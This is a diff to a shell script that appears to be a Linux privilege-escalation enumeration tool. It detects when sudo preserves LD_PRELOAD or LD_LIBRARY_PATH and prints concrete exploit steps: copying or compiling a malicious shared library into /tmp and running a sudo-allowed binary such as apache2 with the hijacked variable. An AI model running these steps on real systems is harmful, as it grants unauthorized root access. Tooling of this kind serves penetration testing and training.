@@ -1105,8 +1105,8 @@ if [ "$sudoenvld_preload" ]; then
 echo -e "${BOLD}${GREEN}[+] LD_PRELOAD is set and is a dangerous environment variable.${RESET}"
 echo -e "[-] Notes on the exploitation of LD_PRELOAD : /notes/env_exploit.txt"
 echo -e "[-] Exploit :" 
-echo -e "     Step 1: Copy the library /exploits/Env_exploit.so to tmp directory."
-echo -e "     Step 2: sudo LD_PRELOAD=/tmp/Env_exploit.so [a bin that can be executed with sudo such as ping/apache2/cp/find] \n"
+echo -e "     Step 1: cp exploits/Env_exploit.so /tmp/"
+echo -e "     Step 2: sudo LD_PRELOAD=/tmp/Env_exploit.so [a bin that can be executed with sudo such as ping/cp/find] \n"
 
 else
   :
@@ -1114,22 +1114,28 @@ fi
 
 # check for LD_LIBRARY_PATH
 
-varAp=$(echo "$cmd" 2>/dev/null | grep "/usr/sbin/apache2" )
-if [ "$varAp" ]; then
+#varAp=$(echo "$cmd" 2>/dev/null | grep "/usr/sbin/apache2" )
+#if [ "$varAp" ]; then
 
 sudoenvld_lib_path=$(echo "$cmd" 2>/dev/null | grep "LD_LIBRARY_PATH" )  
 if [ "$sudoenvld_lib_path" ]; then
 echo -e "${BOLD}${GREEN}[+] LD_LIBRARY_PATH is set and is a dangerous environment variable.${RESET}"
 echo -e "[-] Notes on the exploitation of LD_LIBRARY_PATH : /notes/env_exploit.txt"
 echo -e "[-] Exploit :" 
-echo -e "     Step 1: Copy the library /exploits/Env_exploit2.so to tmp directory. cp exploits/Env_exploit2.so /tmp/libcrypt.so.1"
-echo -e "     Step 2: sudo LD_LIBRARY_PATH=/tmp apache2 \n"
+echo -e "     Step 1 : Identify shared library with cmd > ldd <binary> "
+echo -e "     	example: ldd /usr/sbin/apache2 "
+echo -e "     Step 2: cp exploits/Env_exploit2.so /tmp/libcrypt.so.1"
+echo -e "     OR"
+echo -e "     Step 2: compile lib with cmd > gcc  -o /tmp/<shared_lib> exploits/ld_library.c "
+echo -e "     	example: gcc  -o /tmp/libcrypt.so.1 exploits/ld_library.c "
+echo -e "     Step 3: sudo LD_LIBRARY_PATH=/tmp/ <binary> \n"
+echo -e "     	example: sudo LD_LIBRARY_PATH=/tmp/ apache2"
 
 else
   :
 fi
 
-fi
+#fi
 
 echo -e "${BOLD}${GREEN}[+] Checking for dangerous environment variables such as PS4, PERL5OPT, PYTHONINSPECT,... .${RESET}"
 
